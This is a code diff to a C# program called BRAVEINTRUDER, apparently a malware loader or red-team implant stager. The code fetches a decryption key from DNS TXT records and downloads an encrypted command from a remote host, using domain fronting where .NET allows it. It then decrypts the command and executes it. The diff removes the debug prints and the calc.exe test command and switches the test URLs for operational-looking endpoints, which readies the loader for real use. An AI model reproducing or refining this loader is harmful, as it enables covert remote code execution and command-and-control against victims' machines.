@@ -313,29 +313,23 @@ namespace BRAVEINTRUDER
         {
             //SandboxCheck.izSafe();
 
-            byte[] key = Encoding.ASCII.GetBytes(HelperFunctions.getTXTrecords("ede2db6.concordiafunds.com")[0]);
+            byte[] key = Encoding.ASCII.GetBytes(HelperFunctions.getTXTrecords("fda7hk2.concordiafunds.com")[0]);
             string data; 
             var version = Environment.Version;
             if (version.Major >=4) //domain fronting requires .NET 4.0 or higher
             {
-                Console.WriteLine(".NET 4.0");
-                data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/test-fronting.txt");
+                data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/appdata");
             }
             else //cant domain front, fetch alternate payload
             {
-                Console.WriteLine(".NET 3.5");
-                data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/test-nofronting.txt");
+                data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/data-nf");
             }
-
             
-            Console.WriteLine(data.Substring(0,10));
             byte[] iv = Convert.FromBase64String(data.Split(':')[0]);
             byte[] encryptedCmd = Convert.FromBase64String(data.Split(':')[1]);
 
             string cmd = HelperFunctions.decrypt(encryptedCmd, key, iv);
             string decodedCmd = System.Text.Encoding.Unicode.GetString(Convert.FromBase64String(cmd));
-            string testCmd = "Invoke-Item C:\\windows\\system32\\calc.exe";
-            Console.WriteLine("proceeded to do fun stuff: {0}", decodedCmd.Substring(0,15));
             FunStuff.DoFunStuff(decodedCmd);
         }
     }
